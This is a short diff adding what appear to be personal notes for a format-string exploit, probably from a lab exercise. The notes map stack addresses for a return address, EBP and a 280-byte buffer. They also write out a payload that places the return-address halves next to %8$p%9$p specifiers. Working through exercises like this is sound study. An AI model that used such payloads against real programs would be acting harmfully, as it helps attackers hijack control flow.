@@ -1,0 +1,38 @@
+0xffbfdda8
+-4   : argv
+0xffbfdda4
+-4   : argc
+0xffbfdda0
+-4   : return 
+0xffbfdd9c
+-4   : EBP
+0xffbfdd98 : EBP
+--------------------------print_usage
+-4   : arg
+0xffbfdc50
+-2   : return(low)
+0xffbfdc4e
+-2   : return(high)
+0xffbfdc4c
+-4   : ebp
+0xffbfdc48 : EBP
+-280 : buffer
+0xffbfd9c8
+
+-----------------------------
+
+" \x4e\xdc\xbf\xff\x4c\xdc\xbf\xff%8$p%9$p"
+length 16
+
+buffer: 0x ffbf d978
+
+target: 0x FFBF D988
+ 
+d9ec: 
+ffbf: 
+
+
+
+" \x4e\xdc\xbf\xff\x4c\xdc\xbf\xff%8$p%9$p"
+
+
